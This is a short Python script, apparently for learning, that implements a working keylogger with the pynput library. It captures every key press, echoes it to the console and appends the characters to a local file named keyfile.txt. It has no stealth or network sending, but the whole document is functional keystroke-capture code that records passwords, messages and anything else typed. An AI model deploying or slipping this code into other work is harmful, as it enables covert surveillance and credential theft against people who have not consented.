from pynput import keyboard

def keyPressed(key):
    print(str(key))  # Print the key to the console for debugging purposes
    with open("keyfile.txt", 'a') as logKey: # Open the log file in append mode "a"
        try:
            char = key.char # get the caracter with kay.char
            logKey.write(char) # Write the character to the log file
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed) #  We create a "listener" object that will monitor the keyboard
                                                      #  → We tell it: “every time a key is pressed, call the keyPressed function.”
    listener.start()
    input()